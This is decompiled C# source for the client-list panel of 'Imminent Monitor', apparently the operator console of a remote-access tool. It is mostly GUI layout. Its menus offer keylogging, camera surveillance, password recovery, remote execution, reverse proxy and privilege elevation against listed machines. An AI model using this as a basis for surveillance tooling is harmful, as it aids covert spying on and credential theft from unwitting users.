// Decompiled with JetBrains decompiler
// Type: UserControlClients
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlClients : UserControl
{
  private IContainer icontainer_0;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripSeparator toolStripSeparator_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private ToolStripMenuItem toolStripMenuItem_2;
  private ToolStripMenuItem toolStripMenuItem_3;
  private ToolStripMenuItem toolStripMenuItem_4;
  private ToolStripMenuItem toolStripMenuItem_5;
  private ToolStripMenuItem toolStripMenuItem_6;
  private ToolStripMenuItem toolStripMenuItem_7;
  private ToolStripMenuItem toolStripMenuItem_8;
  private ToolStripMenuItem toolStripMenuItem_9;
  private ToolStripMenuItem toolStripMenuItem_10;
  private ToolStripMenuItem toolStripMenuItem_11;
  private ToolStripMenuItem toolStripMenuItem_12;
  private ToolStripMenuItem toolStripMenuItem_13;
  private ToolStripMenuItem toolStripMenuItem_14;
  private ToolStripMenuItem toolStripMenuItem_15;
  private ToolStripMenuItem toolStripMenuItem_16;
  private ImageList imageList_0;
  private System.Windows.Forms.Timer timer_0;
  private System.Windows.Forms.Timer timer_1;
  private GControl6 gcontrol6_0;
  private TabPage tabPage_0;
  private ColumnHeader columnHeader_0;
  private ColumnHeader columnHeader_1;
  private ColumnHeader columnHeader_2;
  private ColumnHeader columnHeader_3;
  private ColumnHeader columnHeader_4;
  private ColumnHeader columnHeader_5;
  private ColumnHeader columnHeader_6;
  private ColumnHeader columnHeader_7;
  private ColumnHeader columnHeader_8;
  private ColumnHeader columnHeader_9;
  private ColumnHeader columnHeader_10;
  private ColumnHeader columnHeader_11;
  private ColumnHeader columnHeader_12;
  private TabPage tabPage_1;
  private Label label_0;
  private LinkLabel linkLabel_0;
  private LinkLabel linkLabel_1;
  private GClass41 gclass41_0;
  private ColumnHeader columnHeader_13;
  private ColumnHeader columnHeader_14;
  private ColumnHeader columnHeader_15;
  private ColumnHeader columnHeader_16;
  private ColumnHeader columnHeader_17;
  private ColumnHeader columnHeader_18;
  private ColumnHeader columnHeader_19;
  private ColumnHeader columnHeader_20;
  private ColumnHeader columnHeader_21;
  private ContextMenuStrip contextMenuStrip_1;
  private ToolStripMenuItem toolStripMenuItem_17;
  private System.Windows.Forms.Timer timer_2;
  private GClass41 gclass41_1;
  private ColumnHeader columnHeader_22;
  private ColumnHeader columnHeader_23;
  private ColumnHeader columnHeader_24;
  private ColumnHeader columnHeader_25;
  private ColumnHeader columnHeader_26;
  private ColumnHeader columnHeader_27;
  private ColumnHeader columnHeader_28;
  private ColumnHeader columnHeader_29;
  private ColumnHeader columnHeader_30;
  private ToolStripMenuItem toolStripMenuItem_18;
  private ToolStripMenuItem toolStripMenuItem_19;
  private ToolStripMenuItem toolStripMenuItem_20;
  private ColumnHeader columnHeader_31;
  private ToolStripMenuItem toolStripMenuItem_21;
  private ToolStripMenuItem toolStripMenuItem_22;
  private ToolStripMenuItem toolStripMenuItem_23;
  private ToolStripMenuItem toolStripMenuItem_24;
  private ToolStripMenuItem toolStripMenuItem_25;
  private ToolStripMenuItem toolStripMenuItem_26;
  private ToolStripMenuItem toolStripMenuItem_27;
  private ToolStripMenuItem toolStripMenuItem_28;
  private ToolStripMenuItem toolStripMenuItem_29;
  private ToolStripMenuItem toolStripMenuItem_30;
  private ToolStripMenuItem toolStripMenuItem_31;
  private ToolStripMenuItem toolStripMenuItem_32;
  private ToolStripMenuItem toolStripMenuItem_33;
  private ToolStripMenuItem toolStripMenuItem_34;
  private ToolStripMenuItem toolStripMenuItem_35;
  private ToolStripMenuItem toolStripMenuItem_36;
  private ToolStripMenuItem toolStripMenuItem_37;
  private ToolStripMenuItem toolStripMenuItem_38;
  private ToolStripMenuItem toolStripMenuItem_39;
  private ToolStripMenuItem toolStripMenuItem_40;
  private bool bool_0;
  private Random random_0;
  private Queue<GClass18> queue_0;

  public UserControlClients()
  {
    this.Load += new EventHandler(this.UserControlClients_Load);
    this.bool_0 = false;
    this.random_0 = new Random();
    this.queue_0 = new Queue<GClass18>();
    this.method_2();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void method_0()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    this.vmethod_1(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_129(new ToolStripMenuItem());
    this.vmethod_159(new ToolStripMenuItem());
    this.vmethod_161(new ToolStripMenuItem());
    this.vmethod_163(new ToolStripMenuItem());
    this.vmethod_165(new ToolStripMenuItem());
    this.vmethod_167(new ToolStripMenuItem());
    this.vmethod_169(new ToolStripMenuItem());
    this.vmethod_171(new ToolStripMenuItem());
    this.vmethod_173(new ToolStripMenuItem());
    this.vmethod_3(new ToolStripSeparator());
    this.vmethod_5(new ToolStripMenuItem());
    this.vmethod_139(new ToolStripMenuItem());
    this.vmethod_141(new ToolStripMenuItem());
    this.vmethod_175(new ToolStripMenuItem());
    this.vmethod_7(new ToolStripMenuItem());
    this.vmethod_133(new ToolStripMenuItem());
    this.vmethod_143(new ToolStripMenuItem());
    this.vmethod_9(new ToolStripMenuItem());
    this.vmethod_145(new ToolStripMenuItem());
    this.vmethod_147(new ToolStripMenuItem());
    this.vmethod_149(new ToolStripMenuItem());
    this.vmethod_11(new ToolStripMenuItem());
    this.vmethod_13(new ToolStripMenuItem());
    this.vmethod_15(new ToolStripMenuItem());
    this.vmethod_17(new ToolStripMenuItem());
    this.vmethod_19(new ToolStripMenuItem());
    this.vmethod_21(new ToolStripMenuItem());
    this.vmethod_23(new ToolStripMenuItem());
    this.vmethod_131(new ToolStripMenuItem());
    this.vmethod_151(new ToolStripMenuItem());
    this.vmethod_25(new ToolStripMenuItem());
    this.vmethod_137(new ToolStripMenuItem());
    this.vmethod_27(new ToolStripMenuItem());
    this.vmethod_29(new ToolStripMenuItem());
    this.vmethod_31(new ToolStripMenuItem());
    this.vmethod_33(new ToolStripMenuItem());
    this.vmethod_35(new ToolStripMenuItem());
    this.vmethod_37(new ToolStripMenuItem());
    this.vmethod_153(new ToolStripMenuItem());
    this.vmethod_155(new ToolStripMenuItem());
    this.vmethod_157(new ToolStripMenuItem());
    this.vmethod_39(new ImageList(this.icontainer_0));
    this.vmethod_41(new System.Windows.Forms.Timer(this.icontainer_0));
    this.vmethod_43(new System.Windows.Forms.Timer(this.icontainer_0));
    this.vmethod_103(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_105(new ToolStripMenuItem());
    this.vmethod_85(new ColumnHeader());
    this.vmethod_87(new ColumnHeader());
    this.vmethod_89(new ColumnHeader());
    this.vmethod_91(new ColumnHeader());
    this.vmethod_93(new ColumnHeader());
    this.vmethod_95(new ColumnHeader());
    this.vmethod_97(new ColumnHeader());
    this.vmethod_99(new ColumnHeader());
    this.vmethod_107(new System.Windows.Forms.Timer(this.icontainer_0));
    this.vmethod_111(new ColumnHeader());
    this.vmethod_45(new GControl6());
    this.vmethod_47(new TabPage());
    this.vmethod_109(new GClass41());
    this.vmethod_49(new ColumnHeader());
    this.vmethod_51(new ColumnHeader());
    this.vmethod_53(new ColumnHeader());
    this.vmethod_55(new ColumnHeader());
    this.vmethod_57(new ColumnHeader());
    this.vmethod_59(new ColumnHeader());
    this.vmethod_61(new ColumnHeader());
    this.vmethod_63(new ColumnHeader());
    this.vmethod_65(new ColumnHeader());
    this.vmethod_67(new ColumnHeader());
    this.vmethod_69(new ColumnHeader());
    this.vmethod_71(new ColumnHeader());
    this.vmethod_73(new ColumnHeader());
    this.vmethod_101(new ColumnHeader());
    this.vmethod_135(new ColumnHeader());
    this.vmethod_79(new LinkLabel());
    this.vmethod_77(new Label());
    this.vmethod_75(new TabPage());
    this.vmethod_81(new LinkLabel());
    this.vmethod_83(new GClass41());
    this.vmethod_113(new ColumnHeader());
    this.vmethod_115(new ColumnHeader());
    this.vmethod_117(new ColumnHeader());
    this.vmethod_119(new ColumnHeader());
    this.vmethod_121(new ColumnHeader());
    this.vmethod_123(new ColumnHeader());
    this.vmethod_125(new ColumnHeader());
    this.vmethod_127(new ColumnHeader());
    this.vmethod_0().SuspendLayout();
    this.vmethod_102().SuspendLayout();
    this.vmethod_44().SuspendLayout();
    this.vmethod_46().SuspendLayout();
    this.vmethod_74().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_0().Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_0().Items.AddRange(new ToolStripItem[7]
    {
      (ToolStripItem) this.vmethod_128(),
      (ToolStripItem) this.vmethod_158(),
      (ToolStripItem) this.vmethod_2(),
      (ToolStripItem) this.vmethod_4(),
      (ToolStripItem) this.vmethod_144(),
      (ToolStripItem) this.vmethod_10(),
      (ToolStripItem) this.vmethod_32()
    });
    this.vmethod_0().Name = "ContextMenuStripMain";
    ContextMenuStrip contextMenuStrip1 = this.vmethod_0();
    Size size1 = new Size(176, 164);
    Size size2 = size1;
    contextMenuStrip1.Size = size2;
    this.vmethod_128().Name = "NotesToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_128();
    size1 = new Size(175, 22);
    Size size3 = size1;
    toolStripMenuItem1.Size = size3;
    this.vmethod_128().Text = "Notes";
    this.vmethod_158().DropDownItems.AddRange(new ToolStripItem[2]
    {
      (ToolStripItem) this.vmethod_160(),
      (ToolStripItem) this.vmethod_168()
    });
    this.vmethod_158().Name = "FilteringToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_158();
    size1 = new Size(175, 22);
    Size size4 = size1;
    toolStripMenuItem2.Size = size4;
    this.vmethod_158().Text = "Filtering";
    this.vmethod_160().DropDownItems.AddRange(new ToolStripItem[3]
    {
      (ToolStripItem) this.vmethod_162(),
      (ToolStripItem) this.vmethod_164(),
      (ToolStripItem) this.vmethod_166()
    });
    this.vmethod_160().Name = "GroupByToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem3 = this.vmethod_160();
    size1 = new Size(122, 22);
    Size size5 = size1;
    toolStripMenuItem3.Size = size5;
    this.vmethod_160().Text = "Group By";
    this.vmethod_162().Name = "CountryToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem4 = this.vmethod_162();
    size1 = new Size(165, 22);
    Size size6 = size1;
    toolStripMenuItem4.Size = size6;
    this.vmethod_162().Text = "Country";
    this.vmethod_164().Name = "ClientIDToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem5 = this.vmethod_164();
    size1 = new Size(165, 22);
    Size size7 = size1;
    toolStripMenuItem5.Size = size7;
    this.vmethod_164().Text = "Client-ID";
    this.vmethod_166().Name = "OperatingSystemToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem6 = this.vmethod_166();
    size1 = new Size(165, 22);
    Size size8 = size1;
    toolStripMenuItem6.Size = size8;
    this.vmethod_166().Text = "Operating System";
    this.vmethod_168().DropDownItems.AddRange(new ToolStripItem[2]
    {
      (ToolStripItem) this.vmethod_170(),
      (ToolStripItem) this.vmethod_172()
    });
    this.vmethod_168().Name = "SearchToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem7 = this.vmethod_168();
    size1 = new Size(122, 22);
    Size size9 = size1;
    toolStripMenuItem7.Size = size9;
    this.vmethod_168().Text = "Search";
    this.vmethod_170().Name = "ClientsIPToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem8 = this.vmethod_170();
    size1 = new Size(163, 22);
    Size size10 = size1;
    toolStripMenuItem8.Size = size10;
    this.vmethod_170().Text = "Clients IP";
    this.vmethod_172().Name = "ClientsUsernameToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem9 = this.vmethod_172();
    size1 = new Size(163, 22);
    Size size11 = size1;
    toolStripMenuItem9.Size = size11;
    this.vmethod_172().Text = "Clients Username";
    this.vmethod_2().Name = "ToolStripSeparator1";
    ToolStripSeparator toolStripSeparator = this.vmethod_2();
    size1 = new Size(172, 6);
    Size size12 = size1;
    toolStripSeparator.Size = size12;
    this.vmethod_2().Tag = (object) "SEPERATOR";
    this.vmethod_4().DropDownItems.AddRange(new ToolStripItem[7]
    {
      (ToolStripItem) this.vmethod_138(),
      (ToolStripItem) this.vmethod_140(),
      (ToolStripItem) this.vmethod_6(),
      (ToolStripItem) this.vmethod_132(),
      (ToolStripItem) this.vmethod_174(),
      (ToolStripItem) this.vmethod_142(),
      (ToolStripItem) this.vmethod_8()
    });
    this.vmethod_4().Name = "AdministrationToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem10 = this.vmethod_4();
    size1 = new Size(175, 22);
    Size size13 = size1;
    toolStripMenuItem10.Size = size13;
    this.vmethod_4().Tag = (object) "0";
    this.vmethod_4().Text = "Administration";
    this.vmethod_138().Name = "FileExplorerToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem11 = this.vmethod_138();
    size1 = new Size(196, 22);
    Size size14 = size1;
    toolStripMenuItem11.Size = size14;
    this.vmethod_138().Text = "File Explorer";
    this.vmethod_138().ToolTipText = "Manage files on the selected systems";
    this.vmethod_140().Name = "SystemManagersToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem12 = this.vmethod_140();
    size1 = new Size(196, 22);
    Size size15 = size1;
    toolStripMenuItem12.Size = size15;
    this.vmethod_140().Text = "System Managers";
    this.vmethod_174().Name = "ComputerManagementToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem13 = this.vmethod_174();
    size1 = new Size(196, 22);
    Size size16 = size1;
    toolStripMenuItem13.Size = size16;
    this.vmethod_174().Text = "Computer Management";
    this.vmethod_174().ToolTipText = "Remotely control the systems power and more..";
    this.vmethod_6().Name = "RemoteDesktopToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem14 = this.vmethod_6();
    size1 = new Size(196, 22);
    Size size17 = size1;
    toolStripMenuItem14.Size = size17;
    this.vmethod_6().Tag = (object) "0";
    this.vmethod_6().Text = "Remote Desktop";
    this.vmethod_6().ToolTipText = "View and control the system(s) desktop";
    this.vmethod_132().Name = "WindowsRDPToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem15 = this.vmethod_132();
    size1 = new Size(196, 22);
    Size size18 = size1;
    toolStripMenuItem15.Size = size18;
    this.vmethod_132().Text = "HRDP Manager";
    this.vmethod_132().ToolTipText = "Manage Imminent Monitors RDP Module & User Accounts";
    this.vmethod_142().Name = "ReverseProxyToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem16 = this.vmethod_142();
    size1 = new Size(196, 22);
    Size size19 = size1;
    toolStripMenuItem16.Size = size19;
    this.vmethod_142().Text = "Reverse Proxy";
    this.vmethod_142().ToolTipText = "Create a Reverse Proxy link with the system";
    this.vmethod_8().Name = "PasswordRecoveryToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem17 = this.vmethod_8();
    size1 = new Size(196, 22);
    Size size20 = size1;
    toolStripMenuItem17.Size = size20;
    this.vmethod_8().Tag = (object) "0";
    this.vmethod_8().Text = "Recovery";
    this.vmethod_8().ToolTipText = "Recover forgotten passwords";
    this.vmethod_144().DropDownItems.AddRange(new ToolStripItem[2]
    {
      (ToolStripItem) this.vmethod_146(),
      (ToolStripItem) this.vmethod_148()
    });
    this.vmethod_144().Name = "MonitoringToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem18 = this.vmethod_144();
    size1 = new Size(175, 22);
    Size size21 = size1;
    toolStripMenuItem18.Size = size21;
    this.vmethod_144().Text = "Monitoring";
    this.vmethod_146().Name = "CameraSurveillanceToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem19 = this.vmethod_146();
    size1 = new Size(176, 22);
    Size size22 = size1;
    toolStripMenuItem19.Size = size22;
    this.vmethod_146().Text = "Camera Surveillance";
    this.vmethod_148().Name = "KeyloggingToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem20 = this.vmethod_148();
    size1 = new Size(176, 22);
    Size size23 = size1;
    toolStripMenuItem20.Size = size23;
    this.vmethod_148().Text = "Keylogging";
    this.vmethod_148().ToolTipText = "View the keystroke history of the selected system(s)";
    this.vmethod_10().DropDownItems.AddRange(new ToolStripItem[9]
    {
      (ToolStripItem) this.vmethod_12(),
      (ToolStripItem) this.vmethod_18(),
      (ToolStripItem) this.vmethod_130(),
      (ToolStripItem) this.vmethod_150(),
      (ToolStripItem) this.vmethod_24(),
      (ToolStripItem) this.vmethod_136(),
      (ToolStripItem) this.vmethod_26(),
      (ToolStripItem) this.vmethod_28(),
      (ToolStripItem) this.vmethod_30()
    });
    this.vmethod_10().Name = "ClientToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem21 = this.vmethod_10();
    size1 = new Size(175, 22);
    Size size24 = size1;
    toolStripMenuItem21.Size = size24;
    this.vmethod_10().Tag = (object) "0";
    this.vmethod_10().Text = "Client Management";
    this.vmethod_12().DropDownItems.AddRange(new ToolStripItem[2]
    {
      (ToolStripItem) this.vmethod_14(),
      (ToolStripItem) this.vmethod_16()
    });
    this.vmethod_12().Name = "UpdateToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem22 = this.vmethod_12();
    size1 = new Size(206, 22);
    Size size25 = size1;
    toolStripMenuItem22.Size = size25;
    this.vmethod_12().Tag = (object) "0";
    this.vmethod_12().Text = "Update Client";
    this.vmethod_14().Name = "FromFileToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem23 = this.vmethod_14();
    size1 = new Size(124, 22);
    Size size26 = size1;
    toolStripMenuItem23.Size = size26;
    this.vmethod_14().Tag = (object) "0";
    this.vmethod_14().Text = "From File";
    this.vmethod_16().Name = "FromLinkToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem24 = this.vmethod_16();
    size1 = new Size(124, 22);
    Size size27 = size1;
    toolStripMenuItem24.Size = size27;
    this.vmethod_16().Tag = (object) "0";
    this.vmethod_16().Text = "From Link";
    this.vmethod_18().DropDownItems.AddRange(new ToolStripItem[2]
    {
      (ToolStripItem) this.vmethod_20(),
      (ToolStripItem) this.vmethod_22()
    });
    this.vmethod_18().Name = "ExecuteToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem25 = this.vmethod_18();
    size1 = new Size(206, 22);
    Size size28 = size1;
    toolStripMenuItem25.Size = size28;
    this.vmethod_18().Text = "Remote Execute";
    this.vmethod_20().Name = "FromFileToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem26 = this.vmethod_20();
    size1 = new Size(124, 22);
    Size size29 = size1;
    toolStripMenuItem26.Size = size29;
    this.vmethod_20().Tag = (object) "0";
    this.vmethod_20().Text = "From File";
    this.vmethod_22().Name = "FromLinkToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem27 = this.vmethod_22();
    size1 = new Size(124, 22);
    Size size30 = size1;
    toolStripMenuItem27.Size = size30;
    this.vmethod_22().Tag = (object) "0";
    this.vmethod_22().Text = "From Link";
    this.vmethod_130().Name = "ElevatePermissionsToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem28 = this.vmethod_130();
    size1 = new Size(206, 22);
    Size size31 = size1;
    toolStripMenuItem28.Size = size31;
    this.vmethod_130().Text = "Elevate Client Permissions";
    this.vmethod_130().ToolTipText = "Request the user(s) elevation";
    this.vmethod_150().Name = "ScriptingToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem29 = this.vmethod_150();
    size1 = new Size(206, 22);
    Size size32 = size1;
    toolStripMenuItem29.Size = size32;
    this.vmethod_150().Text = "Scripting";
    this.vmethod_150().ToolTipText = "Remotely run html, vbs and batch scripts";
    this.vmethod_24().Name = "PingToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem30 = this.vmethod_24();
    size1 = new Size(206, 22);
    Size size33 = size1;
    toolStripMenuItem30.Size = size33;
    this.vmethod_24().Tag = (object) "0";
    this.vmethod_24().Text = "Ping";
    this.vmethod_136().Image = (Image) Class145.smethod_9();
    this.vmethod_136().Name = "RefreshToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem31 = this.vmethod_136();
    size1 = new Size(206, 22);
    Size size34 = size1;
    toolStripMenuItem31.Size = size34;
    this.vmethod_136().Text = "Refresh";
    this.vmethod_136().ToolTipText = "Refreshes the active window title and idle time for the selected system(s)";
    this.vmethod_26().Name = "RestartToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem32 = this.vmethod_26();
    size1 = new Size(206, 22);
    Size size35 = size1;
    toolStripMenuItem32.Size = size35;
    this.vmethod_26().Tag = (object) "0";
    this.vmethod_26().Text = "Restart";
    this.vmethod_26().ToolTipText = "Restarts Imminent Monitor's Client binary on the remote system(s)";
    this.vmethod_28().Name = "DisconnectToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem33 = this.vmethod_28();
    size1 = new Size(206, 22);
    Size size36 = size1;
    toolStripMenuItem33.Size = size36;
    this.vmethod_28().Tag = (object) "0";
    this.vmethod_28().Text = "Disconnect";
    this.vmethod_28().ToolTipText = "Closes the connection";
    this.vmethod_30().Name = "UninstallToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem34 = this.vmethod_30();
    size1 = new Size(206, 22);
    Size size37 = size1;
    toolStripMenuItem34.Size = size37;
    this.vmethod_30().Tag = (object) "0";
    this.vmethod_30().Text = "Uninstall";
    this.vmethod_30().ToolTipText = "Uninstalls Imminent Monitors Client from the remote system(s)";
    this.vmethod_32().DropDownItems.AddRange(new ToolStripItem[5]
    {
      (ToolStripItem) this.vmethod_34(),
      (ToolStripItem) this.vmethod_36(),
      (ToolStripItem) this.vmethod_152(),
      (ToolStripItem) this.vmethod_154(),
      (ToolStripItem) this.vmethod_156()
    });
    this.vmethod_32().Name = "UserInputToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem35 = this.vmethod_32();
    size1 = new Size(175, 22);
    Size size38 = size1;
    toolStripMenuItem35.Size = size38;
    this.vmethod_32().Tag = (object) "0";
    this.vmethod_32().Text = "User Support";
    this.vmethod_34().Name = "ChatToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem36 = this.vmethod_34();
    size1 = new Size(164, 22);
    Size size39 = size1;
    toolStripMenuItem36.Size = size39;
    this.vmethod_34().Tag = (object) "0";
    this.vmethod_34().Text = "Chat";
    this.vmethod_34().ToolTipText = "Opens a chat dialog between you & the user";
    this.vmethod_36().Name = "MessageBoxToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem37 = this.vmethod_36();
    size1 = new Size(164, 22);
    Size size40 = size1;
    toolStripMenuItem37.Size = size40;
    this.vmethod_36().Tag = (object) "0";
    this.vmethod_36().Text = "Message Box";
    this.vmethod_36().ToolTipText = "Show a message to your user";
    this.vmethod_152().Name = "MicrophoneChatToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem38 = this.vmethod_152();
    size1 = new Size(164, 22);
    Size size41 = size1;
    toolStripMenuItem38.Size = size41;
    this.vmethod_152().Text = "Microphone Chat";
    this.vmethod_154().Name = "TextToSpeechToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem39 = this.vmethod_154();
    size1 = new Size(164, 22);
    Size size42 = size1;
    toolStripMenuItem39.Size = size42;
    this.vmethod_154().Text = "Text to Speech";
    this.vmethod_154().ToolTipText = "Converts your text to speach and plays it through your user(s) primary audio device";
    this.vmethod_156().Name = "SendToWebsiteToolStripMenuItem1";
    ToolStripMenuItem toolStripMenuItem40 = this.vmethod_156();
    size1 = new Size(164, 22);
    Size size43 = size1;
    toolStripMenuItem40.Size = size43;
    this.vmethod_156().Text = "Send to Website";
    this.vmethod_156().ToolTipText = "Sends the user to a website of your choosing";
    this.vmethod_38().ColorDepth = ColorDepth.Depth32Bit;
    ImageList imageList = this.vmethod_38();
    size1 = new Size(16, 16);
    Size size44 = size1;
    imageList.ImageSize = size44;
    this.vmethod_38().TransparentColor = Color.Transparent;
    this.vmethod_40().Interval = 45000;
    this.vmethod_42().Enabled = true;
    this.vmethod_42().Interval = 50000;
    this.vmethod_102().Items.AddRange(new ToolStripItem[1]
    {
      (ToolStripItem) this.vmethod_104()
    });
    this.vmethod_102().Name = "ContextMenuStripOffline";
    ContextMenuStrip contextMenuStrip2 = this.vmethod_102();
    size1 = new Size(108, 26);
    Size size45 = size1;
    contextMenuStrip2.Size = size45;
    this.vmethod_104().Image = (Image) Class145.smethod_22();
    this.vmethod_104().Name = "DeleteToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem41 = this.vmethod_104();
    size1 = new Size(107, 22);
    Size size46 = size1;
    toolStripMenuItem41.Size = size46;
    this.vmethod_104().Text = "Delete";
    this.vmethod_84().DisplayIndex = 1;
    this.vmethod_84().Text = "Location";
    this.vmethod_84().Width = 149;
    this.vmethod_86().DisplayIndex = 2;
    this.vmethod_86().Text = "Username";
    this.vmethod_86().TextAlign = HorizontalAlignment.Center;
    this.vmethod_86().Width = 140;
    this.vmethod_88().DisplayIndex = 3;
    this.vmethod_88().Text = "Operating System";
    this.vmethod_88().Width = 160;
    this.vmethod_90().DisplayIndex = 4;
    this.vmethod_90().Text = "Client Version";
    this.vmethod_90().TextAlign = HorizontalAlignment.Center;
    this.vmethod_90().Width = (int) sbyte.MaxValue;
    this.vmethod_92().DisplayIndex = 5;
    this.vmethod_92().Text = "IP Address";
    this.vmethod_92().TextAlign = HorizontalAlignment.Center;
    this.vmethod_92().Width = 115;
    this.vmethod_94().DisplayIndex = 6;
    this.vmethod_94().Text = "Permissions";
    this.vmethod_94().TextAlign = HorizontalAlignment.Center;
    this.vmethod_94().Width = 106;
    this.vmethod_96().DisplayIndex = 7;
    this.vmethod_96().Text = "Anti-Virus";
    this.vmethod_96().TextAlign = HorizontalAlignment.Center;
    this.vmethod_96().Width = 176;
    this.vmethod_98().DisplayIndex = 0;
    this.vmethod_98().Text = "Install Date";
    this.vmethod_98().Width = 105;
    this.vmethod_106().Enabled = true;
    this.vmethod_106().Interval = 200;
    this.vmethod_44().Controls.Add((Control) this.vmethod_46());
    this.vmethod_44().Controls.Add((Control) this.vmethod_74());
    this.vmethod_44().Dock = DockStyle.Fill;
    GControl6 gcontrol6_1 = this.vmethod_44();
    Point point1 = new Point(0, 0);
    Point point2 = point1;
    gcontrol6_1.Location = point2;
    this.vmethod_44().Name = "HiddenTabControl1";
    this.vmethod_44().SelectedIndex = 0;
    GControl6 gcontrol6_2 = this.vmethod_44();
    size1 = new Size(732, 464);
    Size size47 = size1;
    gcontrol6_2.Size = size47;
    this.vmethod_44().TabIndex = 4;
    this.vmethod_46().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_46().Controls.Add((Control) this.vmethod_108());
    this.vmethod_46().Controls.Add((Control) this.vmethod_78());
    this.vmethod_46().Controls.Add((Control) this.vmethod_76());
    TabPage tabPage1 = this.vmethod_46();
    point1 = new Point(0, 0);
    Point point3 = point1;
    tabPage1.Location = point3;
    this.vmethod_46().Name = "TabPage1";
    TabPage tabPage2 = this.vmethod_46();
    Padding padding1 = new Padding(3);
    Padding padding2 = padding1;
    tabPage2.Padding = padding2;
    TabPage tabPage3 = this.vmethod_46();
    size1 = new Size(732, 464);
    Size size48 = size1;
    tabPage3.Size = size48;
    this.vmethod_46().TabIndex = 0;
    this.vmethod_46().Text = "TabPage1";
    this.vmethod_108().AllowColumnReorder = true;
    this.vmethod_108().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_108().Columns.AddRange(new ColumnHeader[15]
    {
      this.vmethod_48(),
      this.vmethod_50(),
      this.vmethod_52(),
      this.vmethod_54(),
      this.vmethod_56(),
      this.vmethod_58(),
      this.vmethod_60(),
      this.vmethod_62(),
      this.vmethod_64(),
      this.vmethod_66(),
      this.vmethod_68(),
      this.vmethod_70(),
      this.vmethod_72(),
      this.vmethod_100(),
      this.vmethod_134()
    });
    this.vmethod_108().ContextMenuStrip = this.vmethod_0();
    this.vmethod_108().Font = new Font("Segoe UI", 8.25f);
    this.vmethod_108().FullRowSelect = true;
    this.vmethod_108().HideSelection = false;
    GClass41 gclass41_1 = this.vmethod_108();
    point1 = new Point(3, 3);
    Point point4 = point1;
    gclass41_1.Location = point4;
    this.vmethod_108().Name = "AeroListviewClients";
    this.vmethod_108().OwnerDraw = true;
    GClass41 gclass41_2 = this.vmethod_108();
    size1 = new Size(Conversions.ToInteger(Class97.gclass1_0.method_25("f011d92c11e70f2b69908239868a0095")), Conversions.ToInteger(Class97.gclass1_0.method_25("3b80767dbc01b3097bd839b150d5d60c")));
    Size size49 = size1;
    gclass41_2.Size = size49;
    this.vmethod_108().SmallImageList = this.vmethod_38();
    this.vmethod_108().TabIndex = 6;
    this.vmethod_108().UseCompatibleStateImageBehavior = false;
    this.vmethod_108().View = View.Details;
    this.vmethod_48().Text = "Location";
    this.vmethod_48().Width = 149;
    this.vmethod_50().Text = "Latency";
    this.vmethod_50().Width = 78;
    this.vmethod_52().DisplayIndex = 3;
    this.vmethod_52().Text = "Username";
    this.vmethod_52().TextAlign = HorizontalAlignment.Center;
    this.vmethod_52().Width = 140;
    this.vmethod_54().DisplayIndex = 8;
    this.vmethod_54().Text = "Client ID";
